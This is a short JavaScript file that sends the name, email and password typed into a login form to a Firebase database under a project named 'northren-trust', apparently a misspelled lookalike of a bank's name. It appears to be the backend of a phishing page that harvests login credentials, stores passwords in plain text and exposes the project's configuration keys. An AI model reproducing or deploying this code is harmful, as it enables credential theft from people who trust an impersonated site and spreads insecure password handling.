const firebaseConfig = {
    apiKey: "AIzaSyB_XBSnBvuwCb2vfhBLsE-ycrHJVkaYdg4",
    authDomain: "northren-trust.firebaseapp.com",
    databaseURL: "https://northren-trust-default-rtdb.firebaseio.com",
    projectId: "northren-trust",
    storageBucket: "northren-trust.appspot.com",
    messagingSenderId: "179472611020",
    appId: "1:179472611020:web:863c7bf65851b83907b469",
    measurementId: "G-CJ5F74P83G"
  };

  // intialiaze firebase
  firebase.initializeApp(firebaseConfig);

//referance ur databse
var contactformDB= firebase.database().ref('LoginForm')

document.getElementById('LoginForm').addEventListener("submit",submitform);

function submitform(e)
{
    e.preventDefault();

    var name = getElementVal('name');
    var email = getElementVal("email");
    var password = getElementVal("password");

  savemessages (name,email,password);
  
    // console.log(name,emailid,messagecontent);
}

const savemessages = (name,email,password)=>
{
    var newsontactform = contactformDB.push();

    newsontactform.set(
    {
        name : name,
        email : email,
        password: password,
    });
};

const getElementVal = (id) =>
{
    return document.getElementById(id).value;
}

